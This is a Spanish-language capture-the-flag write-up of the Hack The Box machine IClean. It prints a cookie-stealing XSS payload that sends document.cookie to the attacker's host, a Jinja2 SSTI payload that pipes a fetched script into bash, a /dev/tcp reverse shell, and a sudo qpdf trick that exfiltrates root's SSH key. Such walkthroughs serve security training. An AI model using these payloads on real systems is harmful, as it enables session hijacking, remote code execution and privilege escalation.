---
layout: single
title: IClean - Hack The Box
excerpt: "
Para resolver esta máquina, interceptamos la solicitud de inicio de sesión, logrando llevar a cabo un XSS para robar una cookie de sesión válida. Con esta cookie, ingresamos al dashboard, que contiene un sistema de facturación que genera un código QR y un enlace. Al utilizar el enlace, se crea un escaneable, cuya solicitud interceptamos para poder inyectar SSTI. Posteriormente, logramos establecer una Reverse Shell. En el código fuente de la web, descubrimos en texto claro el usuario y la contraseña de la base de datos, encontrando así las credenciales de un usuario válido que desencriptamos. Finalmente, abusamos de los permisos SUDOERS del binario "qpdf" para convertirnos en ROOT."
date: 2024-6-5
classes: wide
header:
  teaser: /assets/images/htb-writeup-iclean/iclean_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - CVE-2021-31630


---

![](/assets/images/htb-writeup-iclean/iclean_logo.png)
# PortScan

```java
# Nmap 7.94SVN scan initiated Tue Jun  4 16:55:14 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.11.12
Nmap scan report for 10.10.11.12
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  4 16:55:24 2024 -- 1 IP address (1 host up) scanned in 10.29 seconds
```

# Sitio Web

![](/assets/images/htb-writeup-iclean/Pasted image 20240605163238.png)

Vemos un **nav** con su respectivo **Login**, intenté ingresar con credenciales por defecto, incluso llevar a cabo un **STTI** blind ya qué por detrás está corriendo un **python**, entre otras técnicas para poder bypassear o ejecutar código a través del Login con **Burpsuite**, pero no logré nada, seguí indagando en la página principal.

![](/assets/images/htb-writeup-iclean/Pasted image 20240605163407.png)

Vemos que tenemos en la página un apartado para solicitar un presupuesto para la limpieza.

![](/assets/images/htb-writeup-iclean/Pasted image 20240605163446.png)

Intercepto esta solicitud con **Burpsuite** para llevar a cabo intentos de posibles vulnerabilidades.. de primero se me ocurre **STTI**, intenté varias maneras pero no logré nada, seguí intentando...


Finalmente, pude llevar a cabo un **XXS** tras varios intentos fallidos, ya que la **DATA** tramitada para las variables debe ser **URLencodeada**, y la respuesta del servidor no muestra nada para guiarnos, así que fue a ciegas mediante un servidor en local con Python, para ver sí lográbamos llevar a cabo la **XXS**.

1. Nos montamos servidor en local con python.
```bash
python3 -m http.server 80
```

2. Payload utilizado en la solicitud para la variable "**service**".
```bash
<script+src%3d"http%3a//10.10.14.x/test"></script>
```

![](/assets/images/htb-writeup-iclean/Pasted image 20240605164714.png)

![](/assets/images/htb-writeup-iclean/Pasted image 20240605164722.png)

viendo qué estamos pudiendo llevar a cabo un **XSS**, se me ocurre tratar de robar la cookie de sesión, es decir un **cookie hijacking**, para poder loguearnos en el **Login** que vimos al principios, así que sustituyo el payload por éste:
```bash
<img+src%3dx+onerror%3dfetch('http%3a//10.10.14.3/'%2bdocument.cookie)%3b>
```

obteniendo así lo que sería una cookie de sesión:
![](/assets/images/htb-writeup-iclean/Pasted image 20240605165222.png)

con el nombre de su variable, así que procedo a remplazar esto en mi navegador, en mi caso uso **Firefox**, es tan fácil como ir a la WEB, hacer **CTRL + SHIFT + C**, luego ir a **Storage** > **Cookies** > **+**, y cambiamos los valores tal que así:

![](/assets/images/htb-writeup-iclean/Pasted image 20240605165539.png)

o también podríamos usar la extensión de navegadores **"cookie-editor"**.

Lamentablemente, al ir a **Login**, recargando no logro nada, pero hago un **fuzzing** rápido a directorios, ya que a lo mejor con la cookie no me redirige directamente, usaré la herramienta "**GoBuster**" para esto.
```bash
❯ gobuster dir -u http://capiclean.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================

/about                (Status: 200) [Size: 5267]
/login                (Status: 200) [Size: 2106]
/services             (Status: 200) [Size: 8592]
/team                 (Status: 200) [Size: 8109]
/quote                (Status: 200) [Size: 2237]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 189] [--> /]
```

descubriendo un directorio "**/dashboard**", así que con la cookie seteada procedo a ir a éste directorio...
![](/assets/images/htb-writeup-iclean/Pasted image 20240605170417.png)

vemos qué estamos ante un **Sistema de factura,** el cual podemos escanear **códigos QR's**, editar servicios, entre otras cosas... me pongo a investigar & probar cosas..

empiezo generando una factura..

![](/assets/images/htb-writeup-iclean/Pasted image 20240605171335.png)

eso me genera un **ID**, intuyo que este ID lo necesitaremos para algo, sigo indaganado..
![](/assets/images/htb-writeup-iclean/Pasted image 20240605171416.png)

el **ID** aparentemente es para generar un **QR**, así que lo pongo acá.
![](/assets/images/htb-writeup-iclean/Pasted image 20240605171538.png)

veo que ahora podemos generar un Escaneable con el link del QR, lo pongo...

![](/assets/images/htb-writeup-iclean/Pasted image 20240605171702.png)

generándose esto, me da por curiosear aquí ya que veo números para tratar de llevar a cabo un **STTI**, lo intercepto con **BurpSuite**.

![](/assets/images/htb-writeup-iclean/Pasted image 20240605171802.png)

en esa **DATA** pruebo en la variable del **QR** inyectar una operación básica **SSTI**..
![](/assets/images/htb-writeup-iclean/Pasted image 20240605172955.png)
![](/assets/images/htb-writeup-iclean/Pasted image 20240605173011.png)

y estamos llevando a cabo un **STTI** exitosamente, pero lo está convirtiendo en **base64**, ya sabiendo esto podría entablarme una **Reverse Shell** de la siguiente manera:

1. Nos creamos un archivo con nombre "**revshell**", con esto dentro:
```bash
#!/bin/bash
bash -c 'bash -i >&/dev/tcp/10.10.14.x/PORT 0>&1'
```

2. En el mismo directorio del "**revshell**" nos montamos un servidor Python.
```python
python3 -m http.server 80
```

3. Abrimos un puerto en escucha para recibir la **Reverse Shell:**
```bash
nc -nlvp PORT
```

5. Usamos este payload en la solicitud:

```python
 {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl IP:PORT/revshell | bash")|attr("read")()}}
```

![](/assets/images/htb-writeup-iclean/Pasted image 20240605173635.png)

logrando acceso a la máquina, sólo quedaría darle [Tratamiento a la TTY](https://4uli.github.io/tratamiento-tty/#).


# Escalada de Privilegios #1 

como **www-data**, miro el directorio Home para ver posibles usuarios, descubriendo así a "**consuela**", indago en el directorio del la app, viendo el **"app.py"** detalladamente descubro esto:
![](/assets/images/htb-writeup-iclean/Pasted image 20240605174045.png)

descubriendo las credenciales de la **DB** en texto claro, así qué procedo a buscar que puertos que estén en uso que coincidan con lo que usan las DB's por defecto con:
```bash
ss -tulnp
```

![](/assets/images/htb-writeup-iclean/Pasted image 20240605174153.png)
viendo que está abierto el **:3306** que suele ser **MySQL**, así que intento conectarme a **MySQL** en local con estas créndeciales.
```bash
mysql -u iclean -p
```

![](/assets/images/htb-writeup-iclean/Pasted image 20240605174435.png)

logrando conectarnos a la base de datos, así que ahora veré las tablas & sus contenidos a ver que encuentro...
![](/assets/images/htb-writeup-iclean/Pasted image 20240605174526.png)

encontrándome esto en la tabla **"users"** de la db "**capiclean**", las contraseñas pero hasheadas, pruebo en [hashes.com](https://hashes.com/en/decrypt/hash) a ver sí es posible desencriptarla, empecé por la de admin pero no funcionó, así que pruebo con el hash de consuela..
![](/assets/images/htb-writeup-iclean/Pasted image 20240605174919.png)

logrando desencriptar la contraseña, ahora pruebo estas credenciales para convertirme en "**consuela**", logrando acceso.

# Escalada de Privilegios #2

Como "**consuela**" listo por **SUDOERS**, viendo ésto:
![](/assets/images/htb-writeup-iclean/Pasted image 20240605175042.png)

qué podemos ejecutar el aparente binario "**qpdf**" como quién queramos, así que es una potencial manera de escalar a **ROOT**, no tengo idea qué es **qpdf** así que hago una investigación en Internet, encontrándome con su [DOCUMENTACIÓN.](https://qpdf.readthedocs.io/en/stable/cli.html#basic-invocation)

y usando ésta linea:
```bash
sudo /usr/bin/qpdf --empty /tmp/pwned.txt --qdf --add-attachment /root/.ssh/id_rsa --
```

crearemos un archivo en el "**tmp**" con la copia de la **id_rsa** de **ROOT**.
![](/assets/images/htb-writeup-iclean/Pasted image 20240605180556.png)

nos copiamos esta clave en nuestra máquina, dándole permisos "**600**" y podremos conectarnos.
![](/assets/images/htb-writeup-iclean/Pasted image 20240605180657.png)
